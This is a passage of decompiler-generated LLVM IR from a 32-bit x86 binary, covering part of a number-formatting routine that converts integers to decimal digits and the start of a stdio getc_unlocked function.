dec_label_pc_80529ad:                             ; preds = %dec_label_pc_8052992, %dec_label_pc_805298b, %dec_label_pc_8052996
  %v0_80529b4 = phi i32 [ %v0_8052996, %dec_label_pc_8052992 ], [ %v0_8052996, %dec_label_pc_805298b ], [ %v1_80529aa, %dec_label_pc_8052996 ]
  %v0_80529ad = phi i32 [ %v0_80529ad111, %dec_label_pc_8052992 ], [ %v0_80529ad111, %dec_label_pc_805298b ], [ %v0_80529ad.pre, %dec_label_pc_8052996 ]
  %v1_80529ad = add i32 %v0_80529ad, 1
  %v8_80529ad = icmp eq i32 %v1_80529ad, 0
  store i32 %v1_80529ad, i32* %ebx.global-to-local, align 4
  br i1 %v8_80529ad, label %dec_label_pc_80529c7, label %dec_label_pc_80529b0

dec_label_pc_80529b0:                             ; preds = %dec_label_pc_80529ad
  %v1_80529b2 = sub i32 -1, %v0_80529ad
  store i32 %v1_80529b2, i32* %eax.global-to-local, align 4
  %v1_80529b4 = inttoptr i32 %v0_80529b4 to i32*
  store i32 176, i32* %v1_80529b4, align 4
  %v0_80529ba = load i32, i32* %eax.global-to-local, align 4
  %v1_80529ba = load i32, i32* @ecx, align 4
  %v2_80529ba = add i32 %v1_80529ba, 4
  %v3_80529ba = inttoptr i32 %v2_80529ba to i32*
  store i32 %v0_80529ba, i32* %v3_80529ba, align 4
  %v0_80529bd = load i32, i32* @ecx, align 4
  %v1_80529bd = add i32 %v0_80529bd, 8
  %v2_80529bd = inttoptr i32 %v1_80529bd to i32*
  store i32 ptrtoint (i32* @global_var_8058553.239 to i32), i32* %v2_80529bd, align 4
  %v0_80529c4 = load i32, i32* @ecx, align 4
  %v1_80529c4 = add i32 %v0_80529c4, 12
  store i32 %v1_80529c4, i32* @ecx, align 4
  br label %dec_label_pc_80529c7

dec_label_pc_80529c7:                             ; preds = %dec_label_pc_80529ad, %dec_label_pc_80529b0
  %v0_80529cb = phi i32 [ %v0_80529b4, %dec_label_pc_80529ad ], [ %v1_80529c4, %dec_label_pc_80529b0 ]
  %v0_80529c7 = load i32, i32* %edx.global-to-local, align 4
  %v1_80529c7 = icmp eq i32 %v0_80529c7, 0
  br i1 %v1_80529c7, label %dec_label_pc_80529da, label %dec_label_pc_80529cb

dec_label_pc_80529cb:                             ; preds = %dec_label_pc_80529c7
  %v1_80529cb = inttoptr i32 %v0_80529cb to i32*
  store i32 112, i32* %v1_80529cb, align 4
  %v0_80529d1 = load i32, i32* %edx.global-to-local, align 4
  %v1_80529d1 = load i32, i32* @ecx, align 4
  %v2_80529d1 = add i32 %v1_80529d1, 4
  %v3_80529d1 = inttoptr i32 %v2_80529d1 to i32*
  store i32 %v0_80529d1, i32* %v3_80529d1, align 4
  %v0_80529d4 = load i32, i32* %edi.global-to-local, align 4
  %v1_80529d4 = load i32, i32* @ecx, align 4
  %v2_80529d4 = add i32 %v1_80529d4, 8
  %v3_80529d4 = inttoptr i32 %v2_80529d4 to i32*
  store i32 %v0_80529d4, i32* %v3_80529d4, align 4
  %v0_80529d7 = load i32, i32* @ecx, align 4
  %v1_80529d7 = add i32 %v0_80529d7, 12
  store i32 %v1_80529d7, i32* @ecx, align 4
  br label %dec_label_pc_80529da

dec_label_pc_80529da:                             ; preds = %dec_label_pc_80529c7, %dec_label_pc_80529cb
  %v0_80529f8 = phi i32 [ %v0_80529cb, %dec_label_pc_80529c7 ], [ %v1_80529d7, %dec_label_pc_80529cb ]
  br i1 %v1_80527f4, label %dec_label_pc_80529ee, label %dec_label_pc_80529e1

dec_label_pc_80529e1:                             ; preds = %dec_label_pc_80529da
  store i32 %tmp156, i32* %eax.global-to-local, align 4
  %v3_80529e8 = load i8, i8* %v2_8052981, align 1
  %v4_80529e8 = and i8 %v3_80529e8, 16
  %v5_80529e8 = icmp eq i8 %v4_80529e8, 0
  br i1 %v5_80529e8, label %dec_label_pc_8052a0b, label %dec_label_pc_80529ee

dec_label_pc_80529ee:                             ; preds = %dec_label_pc_80529e1, %dec_label_pc_80529da
  %v0_80529ee = load i32, i32* %edx.global-to-local, align 4
  %v1_80529f0 = load i32, i32* %ebx.global-to-local, align 4
  %v2_80529f0 = sub i32 %v0_80529ee, %v1_80529f0
  store i32 %v2_80529f0, i32* %eax.global-to-local, align 4
  %v1_80529f2 = load i32, i32* %ebp.global-to-local, align 4
  %v2_80529f2 = sub i32 %v2_80529f0, %v1_80529f2
  %v8_80529f2 = xor i32 %v1_80529f2, %v2_80529f0
  %v9_80529f2 = xor i32 %v2_80529f2, %v2_80529f0
  %v10_80529f2 = and i32 %v9_80529f2, %v8_80529f2
  %v11_80529f2 = icmp slt i32 %v10_80529f2, 0
  %v13_80529f2 = icmp slt i32 %v2_80529f2, 0
  %v2_80529f4 = icmp eq i1 %v13_80529f2, %v11_80529f2
  br i1 %v2_80529f4, label %dec_label_pc_8052a0b, label %dec_label_pc_80529f6

dec_label_pc_80529f6:                             ; preds = %dec_label_pc_80529ee
  %v2_80529f6 = sub i32 %v1_80529f2, %v2_80529f0
  store i32 %v2_80529f6, i32* %ebp.global-to-local, align 4
  %v1_80529f8 = inttoptr i32 %v0_80529f8 to i32*
  store i32 176, i32* %v1_80529f8, align 4
  %v0_80529fe = load i32, i32* %ebp.global-to-local, align 4
  %v1_80529fe = load i32, i32* @ecx, align 4
  %v2_80529fe = add i32 %v1_80529fe, 4
  %v3_80529fe = inttoptr i32 %v2_80529fe to i32*
  store i32 %v0_80529fe, i32* %v3_80529fe, align 4
  %v0_8052a01 = load i32, i32* @ecx, align 4
  %v1_8052a01 = add i32 %v0_8052a01, 8
  %v2_8052a01 = inttoptr i32 %v1_8052a01 to i32*
  store i32 ptrtoint (i32* @global_var_8058553.239 to i32), i32* %v2_8052a01, align 4
  %v0_8052a08 = load i32, i32* @ecx, align 4
  %v1_8052a08 = add i32 %v0_8052a08, 12
  store i32 %v1_8052a08, i32* @ecx, align 4
  br label %dec_label_pc_8052a0b

dec_label_pc_8052a0b:                             ; preds = %dec_label_pc_80529ee, %dec_label_pc_80529e1, %dec_label_pc_80529f6
  %v1_8052a93121 = phi i32 [ %v0_80529f8, %dec_label_pc_80529ee ], [ %v0_80529f8, %dec_label_pc_80529e1 ], [ %v1_8052a08, %dec_label_pc_80529f6 ]
  %v12_8052a0b = icmp eq i8 %stack_var_-197.2, 102
  br i1 %v12_8052a0b, label %dec_label_pc_8052a86, label %dec_label_pc_8052a12

dec_label_pc_8052a12:                             ; preds = %dec_label_pc_8052a0b
  %v5_8052a12 = load i32, i32* %edx.global-to-local, align 4
  %v6_8052a12 = and i32 %v5_8052a12, -256
  %v7_8052a12 = or i32 %v6_8052a12, %stack_var_-42.0
  store i32 %v7_8052a12, i32* %edx.global-to-local, align 4
  %v0_8052a19 = load i32, i32* %esi.global-to-local, align 4
  %v2_8052a19 = icmp slt i32 %v0_8052a19, 0
  %v1_8052a1b = trunc i32 %stack_var_-42.0 to i8
  br i1 %v2_8052a19, label %dec_label_pc_8052a2a, label %dec_label_pc_8052a33

dec_label_pc_8052a2a:                             ; preds = %dec_label_pc_8052a12
  store i32 %v0_8052a19, i32* %edx.global-to-local, align 4
  %v1_8052a2c = sub i32 0, %v0_8052a19
  br label %dec_label_pc_8052a33

dec_label_pc_8052a33:                             ; preds = %dec_label_pc_8052a12, %dec_label_pc_8052a2a
  %storemerge27 = phi i32 [ %v1_8052a2c, %dec_label_pc_8052a2a ], [ %v0_8052a19, %dec_label_pc_8052a12 ]
  %storemerge9 = phi i8 [ 45, %dec_label_pc_8052a2a ], [ 43, %dec_label_pc_8052a12 ]
  store i32 %storemerge27, i32* %edx.global-to-local, align 4
  store i32 0, i32* %stack_var_-27, align 4
  %v2_8052a3b = ptrtoint i32* %stack_var_-27 to i32
  store i32 %v2_8052a3b, i32* %ebx.global-to-local, align 4
  store i32 2, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_8052a47

dec_label_pc_8052a47:                             ; preds = %dec_label_pc_8052a47.backedge, %dec_label_pc_8052a33
  %v0_8052a52 = phi i32 [ %v0_8052a52.pre, %dec_label_pc_8052a47.backedge ], [ %v2_8052a3b, %dec_label_pc_8052a33 ]
  %v0_8052a4f = phi i32 [ %v0_8052a4f.pre, %dec_label_pc_8052a47.backedge ], [ 2, %dec_label_pc_8052a33 ]
  %v0_8052a47 = phi i32 [ %v9_8052a50, %dec_label_pc_8052a47.backedge ], [ %storemerge27, %dec_label_pc_8052a33 ]
  %v1_8052a4e = ashr i32 %v0_8052a47, 31
  %v1_8052a4f = add i32 %v0_8052a4f, 1
  store i32 %v1_8052a4f, i32* %edi.global-to-local, align 4
  %v2_8052a50 = zext i32 %v0_8052a47 to i64
  %v4_8052a50 = zext i32 %v1_8052a4e to i64
  %v5_8052a50 = mul nuw i64 %v4_8052a50, 4294967296
  %v6_8052a50 = or i64 %v5_8052a50, %v2_8052a50
  %v8_8052a50 = sdiv i64 %v6_8052a50, 10
  %v9_8052a50 = trunc i64 %v8_8052a50 to i32
  %v10_8052a50 = srem i64 %v6_8052a50, 10
  %v1_8052a52 = add i32 %v0_8052a52, -1
  store i32 %v1_8052a52, i32* %ebx.global-to-local, align 4
  store i32 %v9_8052a50, i32* %esi.global-to-local, align 4
  %v3_8052a55 = and i32 %v9_8052a50, -256
  %v1_8052a57 = trunc i64 %v10_8052a50 to i8
  %v2_8052a57 = add i8 %v1_8052a57, 48
  %v12_8052a57 = zext i8 %v2_8052a57 to i32
  %v15_8052a57 = or i32 %v12_8052a57, %v3_8052a55
  store i32 %v15_8052a57, i32* %eax.global-to-local, align 4
  %v3_8052a5c = inttoptr i32 %v1_8052a52 to i8*
  store i8 %v2_8052a57, i8* %v3_8052a5c, align 1
  store i32 %v9_8052a50, i32* %edx.global-to-local, align 4
  %v7_8052a60 = icmp sgt i32 %v1_8052a4f, 3
  br i1 %v7_8052a60, label %dec_label_pc_8052a62, label %dec_label_pc_8052a47.backedge

dec_label_pc_8052a62:                             ; preds = %dec_label_pc_8052a47
  %v2_8052a62 = icmp eq i32 %v9_8052a50, 0
  %v1_8052a64 = icmp eq i1 %v2_8052a62, false
  br i1 %v1_8052a64, label %dec_label_pc_8052a47.backedge, label %dec_label_pc_8052a66

dec_label_pc_8052a47.backedge:                    ; preds = %dec_label_pc_8052a62, %dec_label_pc_8052a47
  %v0_8052a4f.pre = load i32, i32* %edi.global-to-local, align 4
  %v0_8052a52.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8052a47

dec_label_pc_8052a66:                             ; preds = %dec_label_pc_8052a62
  %v4_8052a66 = zext i8 %storemerge9 to i32
  %v7_8052a66 = or i32 %v3_8052a55, %v4_8052a66
  store i32 %v7_8052a66, i32* %edx.global-to-local, align 4
  %v0_8052a6a = load i32, i32* %ebx.global-to-local, align 4
  %v1_8052a6a = add i32 %v0_8052a6a, -2
  store i32 %v1_8052a6a, i32* %eax.global-to-local, align 4
  %v3_8052a6d = add i32 %v0_8052a6a, -1
  %v4_8052a6d = inttoptr i32 %v3_8052a6d to i8*
  store i8 %storemerge9, i8* %v4_8052a6d, align 1
  %v5_8052a70 = load i32, i32* %edx.global-to-local, align 4
  %v6_8052a70 = and i32 %v5_8052a70, -256
  %v7_8052a70 = or i32 %v6_8052a70, %stack_var_-42.0
  store i32 %v7_8052a70, i32* %edx.global-to-local, align 4
  %v2_8052a74 = load i32, i32* %ebx.global-to-local, align 4
  %v3_8052a74 = add i32 %v2_8052a74, -2
  %v4_8052a74 = inttoptr i32 %v3_8052a74 to i8*
  store i8 %v1_8052a1b, i8* %v4_8052a74, align 1
  %v0_8052a77 = load i32, i32* @ecx, align 4
  %v1_8052a77 = inttoptr i32 %v0_8052a77 to i32*
  store i32 112, i32* %v1_8052a77, align 4
  %v0_8052a7d = load i32, i32* %edi.global-to-local, align 4
  %v1_8052a7d = load i32, i32* @ecx, align 4
  %v2_8052a7d = add i32 %v1_8052a7d, 4
  %v3_8052a7d = inttoptr i32 %v2_8052a7d to i32*
  store i32 %v0_8052a7d, i32* %v3_8052a7d, align 4
  %v0_8052a80 = load i32, i32* %eax.global-to-local, align 4
  %v1_8052a80 = load i32, i32* @ecx, align 4
  %v2_8052a80 = add i32 %v1_8052a80, 8
  %v3_8052a80 = inttoptr i32 %v2_8052a80 to i32*
  store i32 %v0_8052a80, i32* %v3_8052a80, align 4
  %v0_8052a83 = load i32, i32* @ecx, align 4
  %v1_8052a83 = add i32 %v0_8052a83, 12
  store i32 %v1_8052a83, i32* @ecx, align 4
  br label %dec_label_pc_8052a86

dec_label_pc_8052a86:                             ; preds = %dec_label_pc_8052a0b, %dec_label_pc_80526b5, %dec_label_pc_8052a66
  %v0_8052b05 = phi i32 [ %v1_8052a93121, %dec_label_pc_8052a0b ], [ %v2_80526bd, %dec_label_pc_80526b5 ], [ %v1_8052a83, %dec_label_pc_8052a66 ]
  %v2_8052a86 = ptrtoint i32* %stack_var_-152 to i32
  store i32 %v2_8052a86, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8052a8a

dec_label_pc_8052a8a:                             ; preds = %dec_label_pc_8052a8a, %dec_label_pc_8052a86
  %v0_8052a8a = phi i32 [ %v2_8052a86, %dec_label_pc_8052a86 ], [ %v1_8052a8c, %dec_label_pc_8052a8a ]
  %stack_var_-216.0 = phi i32 [ %v3_80525b7, %dec_label_pc_8052a86 ], [ %v5_8052a8f, %dec_label_pc_8052a8a ]
  %v1_8052a8a = inttoptr i32 %v0_8052a8a to i32*
  %v2_8052a8a = load i32, i32* %v1_8052a8a, align 4
  store i32 %v2_8052a8a, i32* %ebx.global-to-local, align 4
  %v1_8052a8c = add i32 %v0_8052a8a, 12
  store i32 %v1_8052a8c, i32* %eax.global-to-local, align 4
  %v5_8052a8f = sub i32 %stack_var_-216.0, %v2_8052a8a
  %v7_8052a93 = icmp ult i32 %v1_8052a8c, %v0_8052b05
  br i1 %v7_8052a93, label %dec_label_pc_8052a8a, label %dec_label_pc_8052a97

dec_label_pc_8052a97:                             ; preds = %dec_label_pc_8052a8a
  store i32 %v0_8052b05, i32* %esi.global-to-local, align 4
  %v5_8052aaa = icmp eq i8 %stack_var_-26.0, 0
  store i32 160, i32* %stack_var_-168, align 4
  %v1_8052aba = icmp eq i1 %v5_8052aaa, false
  %v2_8052aba = zext i1 %v1_8052aba to i32
  store i32 %v2_8052aba, i32* %edx.global-to-local, align 4
  %v2_8052abd = sub i32 %v5_8052a8f, %v2_8052aba
  store i32 %v2_8052abd, i32* %eax.global-to-local, align 4
  %tmp190 = icmp slt i32 %v2_8052abd, 1
  br i1 %tmp190, label %dec_label_pc_8052b07, label %dec_label_pc_8052ac7

dec_label_pc_8052ac7:                             ; preds = %dec_label_pc_8052a97
  store i32 %tmp156, i32* %edx.global-to-local, align 4
  %v2_8052ace = inttoptr i32 %v1_80525f7 to i8*
  %v3_8052ace = load i8, i8* %v2_8052ace, align 1
  %v4_8052ace = and i8 %v3_8052ace, 8
  %v5_8052ace = icmp eq i8 %v4_8052ace, 0
  br i1 %v5_8052ace, label %dec_label_pc_8052ae9, label %dec_label_pc_8052ad4

dec_label_pc_8052ad4:                             ; preds = %dec_label_pc_8052ac7
  %v1_8052ad4 = add i32 %v0_8052b05, 12
  store i32 %v1_8052ad4, i32* %esi.global-to-local, align 4
  %v1_8052ad7 = inttoptr i32 %v0_8052b05 to i32*
  store i32 160, i32* %v1_8052ad7, align 4
  %v1_8052add = load i32, i32* @ecx, align 4
  %v2_8052add = add i32 %v1_8052add, 4
  %v3_8052add = inttoptr i32 %v2_8052add to i32*
  store i32 %v2_8052abd, i32* %v3_8052add, align 4
  %v0_8052ae0 = load i32, i32* @ecx, align 4
  %v1_8052ae0 = add i32 %v0_8052ae0, 8
  %v2_8052ae0 = inttoptr i32 %v1_8052ae0 to i32*
  store i32 ptrtoint (i32* @global_var_8058553.239 to i32), i32* %v2_8052ae0, align 4
  br label %dec_label_pc_8052b07

dec_label_pc_8052ae9:                             ; preds = %dec_label_pc_8052ac7
  store i32 %tmp156, i32* %ebx.global-to-local, align 4
  %v1_8052af0 = add i32 %tmp156, 16
  %v2_8052af0 = inttoptr i32 %v1_8052af0 to i32*
  %v3_8052af0 = load i32, i32* %v2_8052af0, align 4
  %v9_8052af0 = icmp eq i32 %v3_8052af0, 48
  %v1_8052af4 = icmp eq i1 %v9_8052af0, false
  br i1 %v1_8052af4, label %dec_label_pc_8052b01, label %dec_label_pc_8052af6

dec_label_pc_8052af6:                             ; preds = %dec_label_pc_8052ae9
  %v3_8052af6 = load i32, i32* %stack_var_-152, align 4
  %v5_8052af6 = add i32 %v3_8052af6, %v2_8052abd
  store i32 %v5_8052af6, i32* %stack_var_-152, align 4
  br label %dec_label_pc_8052b05

dec_label_pc_8052afc:                             ; preds = %dec_label_pc_8052b0d
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_8052b34

dec_label_pc_8052b01:                             ; preds = %dec_label_pc_8052ae9
  br label %dec_label_pc_8052b05

dec_label_pc_8052b05:                             ; preds = %dec_label_pc_8052af6, %dec_label_pc_8052b01
  store i32 %v0_8052b05, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_8052b07

dec_label_pc_8052b07:                             ; preds = %dec_label_pc_8052a97, %dec_label_pc_8052ad4, %dec_label_pc_8052b05
  store i32 0, i32* %edi.global-to-local, align 4
  %v2_8052b09 = ptrtoint i32* %stack_var_-168 to i32
  store i32 %v2_8052b09, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8052b0d

dec_label_pc_8052b0d:                             ; preds = %dec_label_pc_8052b2b, %dec_label_pc_8052b07
  call void @__pseudo_call(i32 %tmp156)
  %v1_8052b26 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8052b26 = add i32 %v1_8052b26, 4
  %v3_8052b26 = inttoptr i32 %v2_8052b26 to i32*
  %v4_8052b26 = load i32, i32* %v3_8052b26, align 4
  %v15_8052b26 = icmp eq i32 %v2_8052abd, %v4_8052b26
  %v1_8052b29 = icmp eq i1 %v15_8052b26, false
  br i1 %v1_8052b29, label %dec_label_pc_8052afc, label %dec_label_pc_8052b2b

dec_label_pc_8052b2b:                             ; preds = %dec_label_pc_8052b0d
  %v1_8052b2b = add i32 %v1_8052b26, 12
  store i32 %v1_8052b2b, i32* %ebx.global-to-local, align 4
  %v0_8052b2e = load i32, i32* %edi.global-to-local, align 4
  %v2_8052b2e = add i32 %v0_8052b2e, %v2_8052abd
  store i32 %v2_8052b2e, i32* %edi.global-to-local, align 4
  %v1_8052b30 = load i32, i32* %esi.global-to-local, align 4
  %v7_8052b30 = icmp ult i32 %v1_8052b2b, %v1_8052b30
  br i1 %v7_8052b30, label %dec_label_pc_8052b0d, label %dec_label_pc_8052b34

dec_label_pc_8052b34:                             ; preds = %dec_label_pc_8052b2b, %dec_label_pc_8052afc
  %v0_8052b3a = phi i32 [ -1, %dec_label_pc_8052afc ], [ %v2_8052b2e, %dec_label_pc_8052b2b ]
  store i32 %v0_8052b3a, i32* %eax.global-to-local, align 4
  %v2_8052b3d = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_8052b3d, i32* @esi, align 4
  store i32 %v0_805259a, i32* @edi, align 4
  store i32 %v0_8052599, i32* @ebp, align 4
  ret i32 %v0_8052b3a

; uselistorder directives
  uselistorder i32 %v0_8052b3a, { 1, 0 }
  uselistorder i32 %v2_8052abd, { 1, 0, 2, 4, 3, 5 }
  uselistorder i32 %v2_8052aba, { 1, 0 }
  uselistorder i32 %v1_8052a8c, { 1, 2, 0 }
  uselistorder i32 %v0_8052a8a, { 1, 0 }
  uselistorder i32 %v0_8052b05, { 1, 3, 2, 4, 0 }
  uselistorder i32 %v9_8052a50, { 3, 2, 1, 0, 4 }
  uselistorder i8 %storemerge9, { 1, 0 }
  uselistorder i32 %v0_8052a19, { 2, 1, 0, 3 }
  uselistorder i32 %v2_80529f2, { 1, 0 }
  uselistorder i32 %v1_80529f2, { 1, 0, 2 }
  uselistorder i32 %v2_80529f0, { 2, 0, 1, 3, 4 }
  uselistorder i32 %v0_80529ad, { 1, 0 }
  uselistorder i32 %v2_805291a, { 2, 1, 3, 0 }
  uselistorder i32 %v2_8052914, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v1_8052971, { 4, 0, 3, 1, 2, 5, 6, 7 }
  uselistorder i32 %v1_80528b0, { 1, 0 }
  uselistorder i32 %v0_80528ab, { 1, 2, 0, 3 }
  uselistorder i32 %v2_8052878, { 1, 2, 3, 0, 4 }
  uselistorder i8 %v2_8052873, { 1, 0 }
  uselistorder i8 %v2_805286c, { 1, 2, 3, 0, 4 }
  uselistorder i32 %v0_805286c, { 1, 0, 3, 2 }
  uselistorder i32 %stack_var_-220.3, { 1, 0 }
  uselistorder i32 %v0_80527f6, { 1, 2, 0 }
  uselistorder i32 %stack_var_-42.0, { 0, 2, 1 }
  uselistorder i8 %stack_var_-207.1, { 4, 3, 1, 5, 0, 2 }
  uselistorder i8 %v4_80527db, { 1, 0 }
  uselistorder i32 %tmp195, { 3, 1, 2, 0 }
  uselistorder x86_fp80 %v3_80527a6, { 1, 0 }
  uselistorder i32 %v2_805275f, { 2, 1, 0 }
  uselistorder i32 %v0_8052815, { 1, 2, 0, 3 }
  uselistorder x86_fp80 %v1_8052731, { 1, 0 }
  uselistorder x86_fp80 %v3_8052713, { 2, 0, 1, 3, 6, 7, 5, 8, 4, 9, 10 }
  uselistorder i32 %v3_8052710, { 1, 0 }
  uselistorder x86_fp80 %v4_80526f8, { 2, 0, 1, 3, 4 }
  uselistorder x86_fp80 %v3_80526f2, { 1, 2, 0 }
  uselistorder i32 %v3_80526ef, { 1, 0 }
  uselistorder i32 %v1_80526e8, { 3, 0, 1, 2 }
  uselistorder i32 %stack_var_-220.0, { 2, 0, 1 }
  uselistorder x86_fp80 %v1_8052721, { 8, 1, 2, 5, 3, 4, 6, 0, 7, 9 }
  uselistorder x86_fp80 %v2_80526e9, { 1, 0 }
  uselistorder i8 %v4_8052699, { 1, 0 }
  uselistorder i3 %v1_8052636, { 1, 0, 2 }
  uselistorder i8 %stack_var_-207.0, { 3, 2, 0, 4, 5, 1, 6, 7 }
  uselistorder i8 %v3_80525be, { 1, 0, 2, 3 }
  uselistorder i32 %v3_80525b7, { 1, 0, 2 }
  uselistorder i3 %v4_80525b0, { 0, 2, 1, 3 }
  uselistorder i32* %stack_var_-144, { 1, 0, 2 }
  uselistorder i32* %stack_var_-72, { 1, 0, 2 }
  uselistorder i32* %stack_var_-71, { 1, 0 }
  uselistorder i32* %stack_var_-132, { 2, 0, 1 }
  uselistorder i32* %stack_var_-27, { 1, 0 }
  uselistorder i32* %stack_var_-152, { 0, 1, 4, 2, 3 }
  uselistorder i32* %stack_var_-168, { 1, 0 }
  uselistorder i32 %tmp156, { 14, 13, 12, 11, 10, 9, 8, 7, 0, 6, 1, 2, 3, 5, 4 }
  uselistorder x86_fp80 %tmp155, { 3, 2, 1, 0, 4, 5 }
  uselistorder x86_fp80* %st1.global-to-local, { 9, 8, 10, 4, 11, 2, 0, 1, 3, 7, 6, 5, 12 }
  uselistorder x86_fp80* %st0.global-to-local, { 1, 4, 5, 0, 2, 3, 6, 8, 7 }
  uselistorder i3* %fpu_stat_TOP.global-to-local, { 0, 5, 4, 6, 7, 8, 1, 9, 10, 2, 3 }
  uselistorder i32* %esi.global-to-local, { 2, 0, 1, 3, 4, 7, 6, 8, 5, 9, 10, 11, 12 }
  uselistorder i32* %edx.global-to-local, { 0, 1, 2, 3, 4, 5, 27, 6, 7, 10, 12, 11, 13, 8, 9, 14, 17, 15, 18, 16, 19, 20, 21, 22, 23, 28, 24, 25, 26 }
  uselistorder i32* %edi.global-to-local, { 0, 2, 3, 1, 5, 4, 6, 7, 9, 8, 10 }
  uselistorder i32* %ebx.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 26, 12, 13, 27, 14, 15, 16, 17, 21, 22, 18, 19, 20, 23, 24, 25, 28, 29 }
  uselistorder i32* %ebp.global-to-local, { 0, 1, 4, 5, 2, 6, 8, 3, 7, 9, 10 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 2, 3, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32 }
  uselistorder i64 10, { 1, 0, 2 }
  uselistorder i8 43, { 2, 1, 0 }
  uselistorder i8 45, { 2, 3, 1, 0, 4 }
  uselistorder i8 56, { 1, 0 }
  uselistorder i8 102, { 2, 3, 1, 0 }
  uselistorder i8 103, { 1, 2, 0 }
  uselistorder x86_fp80 0xK401CEE6B280000000000, { 1, 2, 0 }
  uselistorder i32 4096, { 2, 15, 3, 17, 18, 4, 16, 8, 13, 14, 5, 6, 9, 11, 10, 1, 12, 0, 7 }
  uselistorder i32 13, { 0, 5, 4, 1, 2, 3 }
  uselistorder x86_fp80 0xK3FFD8000000000000000, { 1, 0, 2, 3 }
  uselistorder x86_fp80 0xK00000000000000000000, { 0, 2, 3, 4, 1 }
  uselistorder i8 6, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8052b07, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8052b05, { 1, 0 }
  uselistorder label %dec_label_pc_8052a86, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8052a33, { 1, 0 }
  uselistorder label %dec_label_pc_8052a0b, { 2, 0, 1 }
  uselistorder label %dec_label_pc_80529da, { 1, 0 }
  uselistorder label %dec_label_pc_80529c7, { 1, 0 }
  uselistorder label %dec_label_pc_80529ad, { 2, 0, 1 }
  uselistorder label %dec_label_pc_805297a, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8052965, { 1, 0 }
  uselistorder label %dec_label_pc_805295a, { 1, 0 }
  uselistorder label %dec_label_pc_80528e1, { 2, 0, 1 }
  uselistorder label %dec_label_pc_80528d3, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8052899, { 1, 0 }
  uselistorder label %dec_label_pc_8052869.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_8052835, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8052804, { 0, 2, 1 }
  uselistorder label %dec_label_pc_80527ef, { 1, 0 }
  uselistorder label %dec_label_pc_805275b, { 1, 0 }
  uselistorder label %dec_label_pc_8052733, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8052731, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8052721, { 1, 0 }
  uselistorder label %dec_label_pc_80526b5, { 1, 0 }
  uselistorder label %dec_label_pc_80525de, { 1, 0 }
}

define i32 @getc_unlocked() local_unnamed_addr {
entry:
  %edx.global-to-local = alloca i32, align 4
  %tmp = call i16* @__decompiler_undefined_function_6()
  %stack_var_-5 = alloca i8, align 1
  %v0_8052b44 = load i32, i32* @ebx, align 4
  %v4_8052b48 = ptrtoint i16* %tmp to i32
  store i32 %v4_8052b48, i32* @ebx, align 4
  %v1_8052b4c = add i32 %v4_8052b48, 16
  %v2_8052b4c = inttoptr i32 %v1_8052b4c to i32*
  %v3_8052b4c = load i32, i32* %v2_8052b4c, align 4
  %v2_8052b4f = add i32 %v4_8052b48, 24
  %v3_8052b4f = inttoptr i32 %v2_8052b4f to i32*
  %v4_8052b4f = load i32, i32* %v3_8052b4f, align 4
  %v10_8052b4f = icmp ult i32 %v3_8052b4c, %v4_8052b4f
  br i1 %v10_8052b4f, label %dec_label_pc_8052bf1, label %dec_label_pc_8052b58

dec_label_pc_8052b58:                             ; preds = %entry
  %v2_8052b58 = load i16, i16* %tmp, align 2
  %v3_8052b58 = zext i16 %v2_8052b58 to i32
  %v1_8052b5b = and i32 %v3_8052b58, 131
  %v6_8052b65 = icmp ugt i32 %v1_8052b5b, 128
  br i1 %v6_8052b65, label %dec_label_pc_8052b7f, label %dec_label_pc_8052b67

dec_label_pc_8052b67:                             ; preds = %dec_label_pc_8052b58
  %v0_8052b67 = load i32, i32* @edx, align 4
  %v6_8052b6f = call i32 @__stdio_trans2r_o(i16* nonnull %tmp, i32 128, i32 %v0_8052b67, i32 %v0_8052b67)
  %v1_8052b77 = icmp eq i32 %v6_8052b6f, 0
  %v1_8052b79 = icmp eq i1 %v1_8052b77, false
  br i1 %v1_8052b79, label %dec_label_pc_8052c16, label %dec_label_pc_8052b67.dec_label_pc_8052b7f_crit_edge

dec_label_pc_8052b67.dec_label_pc_8052b7f_crit_edge: ; preds = %dec_label_pc_8052b67
  %v0_8052b7f.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_8052b7f

dec_label_pc_8052b7f:                             ; preds = %dec_label_pc_8052b67.dec_label_pc_8052b7f_crit_edge, %dec_label_pc_8052b58
  %v2_8052bb3 = phi i32 [ %v0_8052b7f.pre, %dec_label_pc_8052b67.dec_label_pc_8052b7f_crit_edge ], [ %v4_8052b48, %dec_label_pc_8052b58 ]
  %v1_8052b7f = inttoptr i32 %v2_8052bb3 to i16*
  %v2_8052b7f = load i16, i16* %v1_8052b7f, align 2
  %v3_8052b7f = zext i16 %v2_8052b7f to i32
  store i32 %v3_8052b7f, i32* @ecx, align 4
  %v2_8052b82 = and i16 %v2_8052b7f, 2
  %v3_8052b82 = icmp eq i16 %v2_8052b82, 0
  br i1 %v3_8052b82, label %dec_label_pc_8052ba2, label %dec_label_pc_8052b87

dec_label_pc_8052b87:                             ; preds = %dec_label_pc_8052b7f
  %tmp20 = urem i16 %v2_8052b7f, 2
  %v1_8052b89 = zext i16 %tmp20 to i32
  %tmp19 = sub nsw i32 0, %v1_8052b89
  %v2_8052b8c = and i32 %tmp19, 4
  %v3_8052b8c = add i32 %v2_8052bb3, 36
  %v4_8052b8c = add i32 %v3_8052b8c, %v2_8052b8c
